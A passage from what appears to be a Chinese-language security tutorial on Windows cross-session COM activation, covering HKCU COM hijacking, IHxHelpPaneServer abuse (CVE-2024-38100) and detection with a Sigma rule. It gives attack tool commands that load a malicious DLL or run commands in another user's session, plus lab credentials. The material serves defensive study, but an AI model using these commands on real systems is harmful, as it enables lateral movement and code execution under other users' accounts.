+<h4 id="步骤-4：发现可劫持路径（ComDiver）"><a href="#步骤-4：发现可劫持路径（ComDiver）" class="headerlink" title="步骤 4：发现可劫持路径（ComDiver）"></a>步骤 4：发现可劫持路径（ComDiver）</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ComDiver.exe --target &#123;F87B28F1-DA9A-4F35-8EC0-800EFCF26B83&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>ComDiver 输出解读：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[+] Analyzing CLSID: &#123;F87B28F1-DA9A-4F35-8EC0-800EFCF26B83&#125;</span><br><span class="line">[+] Total CLSID: 1</span><br><span class="line"></span><br><span class="line">[+] Username: MSI\\panag          ← 当前操作用户</span><br><span class="line">[+] RunAs Value: Interactive User  ← ✓ 符合 CSA 条件</span><br><span class="line">[+] Process: slui.exe              ← 该 COM 对象会启动的进程</span><br><span class="line">[+] PID: 48724</span><br><span class="line">[+] Disk Path: C:\Windows\System32\slui.exe</span><br><span class="line">[+] Registry Path: HKLM\SOFTWARE\Classes\CLSID\&#123;...&#125;\LocalServer32</span><br><span class="line"></span><br><span class="line">[?] Load priority hijacking:</span><br><span class="line"></span><br><span class="line">  [1] Writable:  HKCU\...\TreatAs           (Does not exist) ← 可写，可新建</span><br><span class="line">  [2] Non Writable: HKLM\...\TreatAs        (Does not exist)</span><br><span class="line">  [3] Writable:  HKCU\...\InprocServer32    (Does not exist) ← ★ 最佳目标</span><br><span class="line">  [4] Non Writable: HKLM\...\InprocServer32 (Does not exist)</span><br><span class="line">  [5] Writable:  HKCU\...\LocalServer32     (Does not exist) ← 可选目标</span><br><span class="line">  [6] Non Writable: HKLM\...\LocalServer32  (Exists)         ← 原始配置，不可写</span><br><span class="line"></span><br><span class="line">  [6] Real Path: HKLM\Software\Classes\CLSID\&#123;...&#125;\LocalServer32</span><br></pre></td></tr></table></figure>
+
+<p><strong>为什么 HKCU 可以攻击？</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Windows 注册表覆盖规则：</span><br><span class="line"></span><br><span class="line">  HKCU（当前用户级）优先级 &gt; HKLM（机器级）</span><br><span class="line"></span><br><span class="line">  正常情况：</span><br><span class="line">    HKCU 没有 InprocServer32 → 用 HKLM 的原始配置 → 加载合法 DLL</span><br><span class="line"></span><br><span class="line">  劫持后：</span><br><span class="line">    攻击者在 HKCU 新建 InprocServer32 → 指向恶意 DLL</span><br><span class="line">    Windows 优先读 HKCU → 加载恶意 DLL</span><br></pre></td></tr></table></figure>
+
+<h4 id="步骤-5：执行-COM-劫持"><a href="#步骤-5：执行-COM-劫持" class="headerlink" title="步骤 5：执行 COM 劫持"></a>步骤 5：执行 COM 劫持</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ComHijackWrite.exe 10.0.0.13 S-1-5-21-3350618378-224581277-4027363269-500 &#123;F87B28F1-DA9A-4F35-8EC0-800EFCF26B83&#125; C:\temp\demon.x64.dll</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>10.0.0.13</code></td>
+<td>目标主机 IP</td>
+</tr>
+<tr>
+<td><code>S-1-5-21-...-500</code></td>
+<td>目标用户的 SID（安全标识符）</td>
+</tr>
+<tr>
+<td><code>{F87B28F1...}</code></td>
+<td>目标 CLSID</td>
+</tr>
+<tr>
+<td><code>C:\temp\demon.x64.dll</code></td>
+<td>恶意 DLL 路径</td>
+</tr>
+</tbody></table>
+<p><strong>ComHijackWrite 做了什么？</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">在目标机器的注册表中创建/修改：</span><br><span class="line"></span><br><span class="line">  HKCU\Software\Classes\CLSID\&#123;F87B28F1...&#125;\InprocServer32</span><br><span class="line">  默认值 = C:\temp\demon.x64.dll</span><br><span class="line"></span><br><span class="line">  这样当该 COM 对象被激活时：</span><br><span class="line">    Windows 检查 HKCU → 发现 InprocServer32</span><br><span class="line">    → 加载 C:\temp\demon.x64.dll</span><br><span class="line">    → DLL 的 DllMain 执行 → 代码在目标用户会话中运行</span><br></pre></td></tr></table></figure>
+
+<h4 id="步骤-6：激活-COM-对象"><a href="#步骤-6：激活-COM-对象" class="headerlink" title="步骤 6：激活 COM 对象"></a>步骤 6：激活 COM 对象</h4><p>攻击者通过 COM API 在目标会话中激活 COM 对象。以下是完整的 API 调用链：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">步骤 6.1：CoCreateInstance 创建 COM 对象</span><br><span class="line">  → 获取接口指针</span><br><span class="line"></span><br><span class="line">步骤 6.2：QueryInterface 查询 ISpecialSystemProperties 接口</span><br><span class="line">  → 获取设置会话 ID 的能力</span><br><span class="line"></span><br><span class="line">步骤 6.3：SetSessionId 设置目标会话 ID</span><br><span class="line">  → 告诉 COM 对象：&quot;在会话 X 中激活&quot;</span><br><span class="line"></span><br><span class="line">步骤 6.4：StandardGetInstanceFromIStorage</span><br><span class="line">  → 在目标会话中创建 COM 对象实例</span><br><span class="line">  → Windows 启动对应的进程（如 HelpPane.exe / slui.exe）</span><br><span class="line">  → 加载被劫持的 DLL</span><br><span class="line">  → 代码在目标用户的上下文中执行</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="五、两种利用模式详解"><a href="#五、两种利用模式详解" class="headerlink" title="五、两种利用模式详解"></a>五、两种利用模式详解</h2><h3 id="5-1-模式-A：利用-COM-对象本身的方法（如-IHxHelpPaneServer）"><a href="#5-1-模式-A：利用-COM-对象本身的方法（如-IHxHelpPaneServer）" class="headerlink" title="5.1 模式 A：利用 COM 对象本身的方法（如 IHxHelpPaneServer）"></a>5.1 模式 A：利用 COM 对象本身的方法（如 IHxHelpPaneServer）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">前提：该 COM 对象的接口恰好提供了能执行命令的方法</span><br><span class="line"></span><br><span class="line">典型代表：IHxHelpPaneServer</span><br><span class="line">  接口定义：</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[<span class="meta">ComImport, Guid(<span class="string">&quot;8cec592c-07a1-11d9-b15e-000d56bfe6ee&quot;</span>),</span></span><br><span class="line"><span class="meta"> InterfaceType(ComInterfaceType.InterfaceIsIUnknown)</span>]</span><br><span class="line"><span class="keyword">interface</span> <span class="title">IHxHelpPaneServer</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">DisplayTask</span>(<span class="params"><span class="built_in">string</span> task</span>)</span>;        <span class="comment">// 显示任务</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">DisplayContents</span>(<span class="params"><span class="built_in">string</span> contents</span>)</span>; <span class="comment">// 显示内容</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">DisplaySearchResults</span>(<span class="params"><span class="built_in">string</span> search</span>)</span>; <span class="comment">// 显示搜索结果</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Execute</span>(<span class="params">[MarshalAs(UnmanagedType.LPWStr</span>)] <span class="built_in">string</span> <span class="keyword">file</span>)</span>; <span class="comment">// 执行文件！</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// C 语言中的 ID 初始化</span></span><br><span class="line">HRESULT <span class="title function_">CoInitializeIHxHelpIds</span><span class="params">(LPGUID Clsid, LPGUID Iid)</span></span><br><span class="line">&#123;</span><br><span class="line">    HRESULT Result = S_OK;</span><br><span class="line">    <span class="keyword">if</span> (!SUCCEEDED(Result = CLSIDFromString(</span><br><span class="line">        <span class="string">L&quot;&#123;8cec58ae-07a1-11d9-b15e-000d56bfe6ee&#125;&quot;</span>, Clsid)))</span><br><span class="line">        <span class="keyword">return</span> Result;</span><br><span class="line">    <span class="keyword">if</span> (!SUCCEEDED(Result = CLSIDFromString(</span><br><span class="line">        <span class="string">L&quot;&#123;8cec592c-07a1-11d9-b15e-000d56bfe6ee&#125;&quot;</span>, Iid)))</span><br><span class="line">        <span class="keyword">return</span> Result;</span><br><span class="line">    <span class="keyword">return</span> Result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Execute() 方法的发现过程：</span><br><span class="line"></span><br><span class="line">  1. COM 接口定义是公开的（IDL 文件、Windows SDK 头文件）</span><br><span class="line">  2. 安全研究员通过 oleview / oleviewdotnet 查看 COM 接口</span><br><span class="line">  3. 发现 IHxHelpPaneServer 有 Execute() 方法</span><br><span class="line">  4. 结合 CVE-2024-38100 的跨会话执行问题</span><br><span class="line">  5. 发布了 IHxExec 和 SessionHop PoC</span><br><span class="line"></span><br><span class="line">为什么 Execute() 能被滥用？</span><br><span class="line">  原始设计：HelpPane.exe 是帮助面板，Execute() 用于打开用户请求的帮助文件</span><br><span class="line">  攻击者视角：Execute() 可以执行任意文件路径 → 被用来执行恶意代码</span><br></pre></td></tr></table></figure>
+
+<p><strong>执行命令：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># IHxExec - 最小化 PoC，在目标会话中执行命令</span></span><br><span class="line">IHxExec.exe -s 1 -c C:/Windows/system32/calc.exe</span><br><span class="line"><span class="comment"># -s 1 = 会话 1</span></span><br><span class="line"><span class="comment"># -c 要执行的命令</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># SessionHop - 本地会话跳转</span></span><br><span class="line">dotnet inline-execute SessionHop.exe 2 C:\temp\demon.x64.exe</span><br><span class="line"><span class="comment"># 2 = 目标会话 ID</span></span><br><span class="line"><span class="comment"># C:\temp\demon.x64.exe = 要执行的文件</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>SessionHop 工作原理：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SessionHop 使用 Session Moniker（会话标识器）技术：</span><br><span class="line">  1. 创建一个指向目标会话的 Moniker</span><br><span class="line">  2. 通过 Moniker 激活 IHxHelpPaneServer COM 对象</span><br><span class="line">  3. 调用 Execute() 接口执行任意文件</span><br><span class="line">  4. 代码在指定会话中以该会话用户的身份运行</span><br></pre></td></tr></table></figure>
+
+<h3 id="5-2-模式-B：COM-劫持-DLL-加载（如-sppui）"><a href="#5-2-模式-B：COM-劫持-DLL-加载（如-sppui）" class="headerlink" title="5.2 模式 B：COM 劫持 + DLL 加载（如 sppui）"></a>5.2 模式 B：COM 劫持 + DLL 加载（如 sppui）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">前提：该 COM 对象没有直接的 Execute() 方法</span><br><span class="line">但配置为 Interactive User，且可以劫持其 DLL 加载路径</span><br><span class="line"></span><br><span class="line">典型代表：sppui（Software Protection Platform User Interface）</span><br><span class="line">  这个 COM 对象用于管理 Windows 许可证和激活</span><br><span class="line">  它没有 Execute() 方法</span><br><span class="line">  但通过内部的 WMI 调用可以间接执行命令</span><br></pre></td></tr></table></figure>
+
+<p><strong>执行命令：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sppui.exe 10.0.0.13 2 Administrator Password123 ipurple.lab <span class="string">&quot;cmd.exe /c ipconfig &gt; C:\out.txt&quot;</span></span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>sppui.exe</code></td>
+<td>利用 sppui COM 接口的工具</td>
+</tr>
+<tr>
+<td><code>10.0.0.13</code></td>
+<td>目标主机 IP</td>
+</tr>
+<tr>
+<td><code>2</code></td>
+<td>目标用户会话 ID</td>
+</tr>
+<tr>
+<td><code>Administrator</code></td>
+<td>目标用户名</td>
+</tr>
+<tr>
+<td><code>Password123</code></td>
+<td>目标用户密码</td>
+</tr>
+<tr>
+<td><code>ipurple.lab</code></td>
+<td>目标所在 AD 域</td>
+</tr>
+<tr>
+<td><code>&quot;cmd.exe /c ipconfig &gt; C:\out.txt&quot;</code></td>
+<td>要执行的命令</td>
+</tr>
+</tbody></table>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sppui 攻击流程：</span><br><span class="line">  1. 通过 WMI 连接到目标主机（使用提供的凭证）</span><br><span class="line">  2. CoCreateInstanceEx 激活 sppui COM 对象</span><br><span class="line">  3. 通过 sppui 的内部接口触发 WMI 调用</span><br><span class="line">  4. WMI 的 Win32_Process.Create 执行任意命令</span><br><span class="line">  5. 命令在目标会话中以目标用户权限运行</span><br></pre></td></tr></table></figure>
+
+<h3 id="5-3-两种模式对比"><a href="#5-3-两种模式对比" class="headerlink" title="5.3 两种模式对比"></a>5.3 两种模式对比</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">SessionHop（模式 A）：</span><br><span class="line">  COM 对象有 Execute() 方法</span><br><span class="line">  → 直接调用 Execute()</span><br><span class="line">  → 最简单直接</span><br><span class="line">  → HelpPane.exe 会启动</span><br><span class="line"></span><br><span class="line">sppui（模式 B）：</span><br><span class="line">  COM 对象没有 Execute() 方法</span><br><span class="line">  → 通过 WMI 间接执行</span><br><span class="line">  → 更隐蔽，但流程更复杂</span><br><span class="line">  → slui.exe + WmiPrvSE.exe 会启动</span><br><span class="line"></span><br><span class="line">本质区别：COM 对象提供的接口方法不同，导致利用方式不同</span><br></pre></td></tr></table></figure>
+
+<h3 id="5-4-攻击者如何选择？"><a href="#5-4-攻击者如何选择？" class="headerlink" title="5.4 攻击者如何选择？"></a>5.4 攻击者如何选择？</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">取决于目标环境：</span><br><span class="line"></span><br><span class="line">  1. 枚举所有 RunAs=Interactive User 的 CLSID</span><br><span class="line">  2. 检查每个 CLSID 的接口方法</span><br><span class="line">     → 有 Execute() 或类似方法 → 模式 A</span><br><span class="line">     → 没有直接方法 → 看能否走间接路径（WMI 等）→ 模式 B</span><br><span class="line">  3. 考虑检测难度</span><br><span class="line">     → IHxHelpPaneServer：HelpPane.exe 在现代 Windows 上罕见，容易被发现</span><br><span class="line">     → sppui：WMI 活动在企业中常见，更难区分正常和异常</span><br><span class="line">  4. 选择阻力最小的路径</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="六、关键-API-与接口解析"><a href="#六、关键-API-与接口解析" class="headerlink" title="六、关键 API 与接口解析"></a>六、关键 API 与接口解析</h2><h3 id="6-1-COM-激活-API-链"><a href="#6-1-COM-激活-API-链" class="headerlink" title="6.1 COM 激活 API 链"></a>6.1 COM 激活 API 链</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">CoCreateInstance / CoCreateInstanceEx</span><br><span class="line">  ↓</span><br><span class="line">  创建 COM 对象实例</span><br><span class="line">  获取接口指针</span><br><span class="line"></span><br><span class="line">QueryInterface（ISpecialSystemProperties）</span><br><span class="line">  ↓</span><br><span class="line">  查询特殊系统属性接口</span><br><span class="line">  用于获取设置会话 ID 的能力</span><br><span class="line"></span><br><span class="line">SetSessionId</span><br><span class="line">  ↓</span><br><span class="line">  设置目标会话 ID</span><br><span class="line">  告诉 COM 在哪个会话中激活</span><br><span class="line"></span><br><span class="line">StandardGetInstanceFromIStorage</span><br><span class="line">  ↓</span><br><span class="line">  从存储对象创建新实例</span><br><span class="line">  在目标会话中触发 COM 对象启动</span><br></pre></td></tr></table></figure>
+
+<h3 id="6-2-会话枚举-API"><a href="#6-2-会话枚举-API" class="headerlink" title="6.2 会话枚举 API"></a>6.2 会话枚举 API</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 需要钩子的 API（EDR 检测点）</span></span><br><span class="line">WTSOpenServer              <span class="comment">// 连接到远程终端服务器</span></span><br><span class="line">WTSEnumerateSessions       <span class="comment">// 枚举所有会话</span></span><br><span class="line">WTSQuerySessionInformation  <span class="comment">// 查询会话详细信息</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="6-3-COM-接口调用-API"><a href="#6-3-COM-接口调用-API" class="headerlink" title="6.3 COM 接口调用 API"></a>6.3 COM 接口调用 API</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CoCreateInstance / CoCreateInstanceEx  <span class="comment">// 创建 COM 实例</span></span><br><span class="line">QueryInterface                         <span class="comment">// 查询接口</span></span><br><span class="line">CoGetClassObject                       <span class="comment">// 获取类工厂</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="七、IHxHelpPaneServer-的-CVE-2024-38100"><a href="#七、IHxHelpPaneServer-的-CVE-2024-38100" class="headerlink" title="七、IHxHelpPaneServer 的 CVE-2024-38100"></a>七、IHxHelpPaneServer 的 CVE-2024-38100</h2><h3 id="7-1-漏洞背景"><a href="#7-1-漏洞背景" class="headerlink" title="7.1 漏洞背景"></a>7.1 漏洞背景</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">CVE-2024-38100：</span><br><span class="line">  影响组件：Windows HelpPane.exe（帮助面板）</span><br><span class="line">  漏洞类型：权限提升 / 跨会话执行</span><br><span class="line">  发现时间：2024年</span><br><span class="line"></span><br><span class="line">  HelpPane.exe 原本用于显示 Windows 帮助内容</span><br><span class="line">  在 Windows 10/11 中已停止使用，但可执行文件仍存在</span><br><span class="line">  </span><br><span class="line">  漏洞本质：</span><br><span class="line">    IHxHelpPaneServer COM 对象的 Execute() 方法</span><br><span class="line">    可以在任意会话中执行任意文件</span><br><span class="line">    而 Windows 没有对此进行适当的权限检查</span><br></pre></td></tr></table></figure>
+
+<h3 id="7-2-漏洞利用链"><a href="#7-2-漏洞利用链" class="headerlink" title="7.2 漏洞利用链"></a>7.2 漏洞利用链</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. 攻击者获取目标机器的管理员权限</span><br><span class="line">2. 找到有活跃交互式会话的目标用户</span><br><span class="line">3. 创建 IHxHelpPaneServer COM 对象</span><br><span class="line">4. 通过 SetSessionId 切换到目标用户会话</span><br><span class="line">5. 调用 Execute() 执行恶意文件</span><br><span class="line">6. 恶意代码以目标用户权限在目标会话中运行</span><br></pre></td></tr></table></figure>
+
+<h3 id="7-3-与-CSA-的关系"><a href="#7-3-与-CSA-的关系" class="headerlink" title="7.3 与 CSA 的关系"></a>7.3 与 CSA 的关系</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">CVE-2024-38100 是 CSA 技术的一个具体利用案例</span><br><span class="line">CSA 是更广泛的技术类别，CVE-2024-38100 只是其中一种实现</span><br><span class="line"></span><br><span class="line">CSA 不一定需要 CVE：</span><br><span class="line">  如果有 DLL 劫持路径 → 不需要特定 CVE</span><br><span class="line">  如果 COM 对象有可滥用的方法 → 可以直接利用</span><br><span class="line">  CVE-2024-38100 只是让 IHxHelpPaneServer 的利用更加直接</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="八、检测方法详解"><a href="#八、检测方法详解" class="headerlink" title="八、检测方法详解"></a>八、检测方法详解</h2><h3 id="8-1-检测难点"><a href="#8-1-检测难点" class="headerlink" title="8.1 检测难点"></a>8.1 检测难点</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">CSA 攻击涉及多个合法 Windows 行为：</span><br><span class="line"></span><br><span class="line">  ① 修改注册表 → 合法的注册表操作</span><br><span class="line">  ② COM 激活 → 合法的 COM 调用</span><br><span class="line">  ③ 进程启动 → 合法的进程创建</span><br><span class="line">  ④ 命令执行 → 合法的命令执行</span><br><span class="line"></span><br><span class="line">单独看每一步都&quot;正常&quot;</span><br><span class="line">必须把它们关联起来才能发现异常</span><br></pre></td></tr></table></figure>
+
+<h3 id="8-2-检测一：进程创建监控（Event-ID-4688）"><a href="#8-2-检测一：进程创建监控（Event-ID-4688）" class="headerlink" title="8.2 检测一：进程创建监控（Event ID 4688）"></a>8.2 检测一：进程创建监控（Event ID 4688）</h3><h4 id="HelpPane-exe-异常子进程检测"><a href="#HelpPane-exe-异常子进程检测" class="headerlink" title="HelpPane.exe 异常子进程检测"></a>HelpPane.exe 异常子进程检测</h4><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># SIGMA 规则</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">Suspicious</span> <span class="string">Child</span> <span class="string">Process</span> <span class="string">of</span> <span class="string">HelpPane.exe</span> <span class="string">(IHxHelpPaneServer</span> <span class="string">Cross-Session</span> <span class="string">Execution)</span></span><br><span class="line"><span class="attr">id:</span> <span class="string">a1b2c3d4-helppane-cross-session</span></span><br><span class="line"><span class="attr">status:</span> <span class="string">experimental</span></span><br><span class="line"><span class="attr">description:</span> <span class="string">检测</span> <span class="string">HelpPane.exe</span> <span class="string">生成非浏览器子进程，特征为</span> <span class="string">IHxHelpPaneServer</span> <span class="string">DCOM</span> <span class="string">滥用</span></span><br><span class="line"><span class="attr">references:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">https://cicada-8.medium.com/process-injection-is-dead-long-live-ihxhelppaneserver-af8f20431b5d</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">https://decoder.cloud/2024/07/16/cve-2024-38100-leaked-wallpaper/</span></span><br><span class="line"><span class="attr">logsource:</span></span><br><span class="line">  <span class="attr">category:</span> <span class="string">process_creation</span></span><br><span class="line">  <span class="attr">product:</span> <span class="string">windows</span></span><br><span class="line"><span class="attr">detection:</span></span><br><span class="line">  <span class="attr">selection:</span></span><br><span class="line">    <span class="string">ParentImage|endswith:</span> <span class="string">&#x27;\HelpPane.exe&#x27;</span></span><br><span class="line">  <span class="attr">filter_legit:</span></span><br><span class="line">    <span class="string">Image|endswith:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&#x27;\HelpPane.exe&#x27;</span>         <span class="comment"># 自身</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&#x27;\iexplore.exe&#x27;</span>         <span class="comment"># IE（合法的子进程）</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&#x27;\msedge.exe&#x27;</span>           <span class="comment"># Edge</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&#x27;\msedgewebview2.exe&#x27;</span>   <span class="comment"># WebView2</span></span><br><span class="line">  <span class="attr">condition:</span> <span class="string">selection</span> <span class="string">and</span> <span class="string">not</span> <span class="string">filter_legit</span></span><br><span class="line"><span class="attr">fields:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">User</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">ParentCommandLine</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">CommandLine</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">LogonId</span></span><br><span class="line"><span class="attr">level:</span> <span class="string">high</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>规则原理：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">HelpPane.exe 正常行为：</span><br><span class="line">  启动 → 打开浏览器显示帮助 → 结束</span><br><span class="line">  只会生成浏览器子进程（iexplore.exe / msedge.exe）</span><br><span class="line"></span><br><span class="line">HelpPane.exe 被 CSA 利用后：</span><br><span class="line">  启动 → Execute(&quot;malware.exe&quot;) → malware.exe 启动</span><br><span class="line">  malware.exe 不是浏览器 → 告警！</span><br><span class="line"></span><br><span class="line">为什么有效：</span><br><span class="line">  Windows 10/11 已停止使用 HelpPane</span><br><span class="line">  任何 HelpPane.exe 的启动本身就是可疑行为</span><br><span class="line">  加上非浏览器子进程 → 高置信度告警</span><br></pre></td></tr></table></figure>
+
